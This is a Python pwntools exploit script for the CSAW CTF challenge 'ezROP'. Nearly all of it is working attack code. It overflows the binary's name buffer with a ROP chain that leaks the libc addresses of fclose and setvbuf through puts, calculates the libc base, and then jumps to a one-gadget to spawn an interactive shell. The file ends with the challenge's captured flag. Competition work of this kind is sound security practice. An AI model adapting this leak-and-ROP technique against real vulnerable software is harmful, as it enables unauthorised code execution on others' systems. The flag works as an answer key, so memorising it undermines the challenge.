#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.chal.csaw.io --port 5002 ./ezROP
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ezROP')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.chal.csaw.io'
port = int(args.PORT or 5002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#tbreak main
# right before return
break *0x401532
#readn
#break *0x401310
break *0x401508
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
io.recvuntil("My friend, what's your name?\n")
#payload = cyclic(0x100-1)

payload = b'A'*3
payload += b'\n'
payload += b'A'*116
payload += p64(0x04015a3)
payload += p64(0x00000000404018) #leak fclose+0
payload += p64(0x4010a0) #puts
payload += p64(0x04015a3)
payload += p64(0x00000000404038) #leak setvbuf+0
payload += p64(0x4010a0) #puts
payload += p64(0x401120) #_start in order to loop
io.sendline(payload)
data: bytes = io.recvuntil('\n') # nice to meet you message
data: bytes = io.recvuntil('\n')
data = data[0:6]
data += b'\x00'
data += b'\x00'
leak_fclose = u64(data)

print('-'*80)
data = io.recvuntil('\n')
data = data[0:6]
data += b'\x00'
data += b'\x00'
for i in data:
    print(f'i: {hex(i)}')
leak_setvbuf = u64(data)
OFFSET_FCLOSE = 0x81dd0
libc_base = leak_fclose - OFFSET_FCLOSE

print(f'fclose:  {hex(leak_fclose)}')
print(f'setvbuf: {hex(leak_setvbuf)}')
print(f'libc base: {hex(libc_base)}')
io.recvuntil("My friend, what's your name?\n")

payload = b'A'*3
payload += b'\n'
payload += b'A'*116

POP_R = 0x000000000040159c          #: pop r12; pop r13; pop r14; pop r15; ret;
payload += p64(POP_R)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
# one gadget
payload += p64(libc_base + 0xe3afe)
io.sendline(payload)

io.interactive()
# flag{53bb4218b851affb894fad151652dc333a024990454a0ee32921509a33ebbeb4}
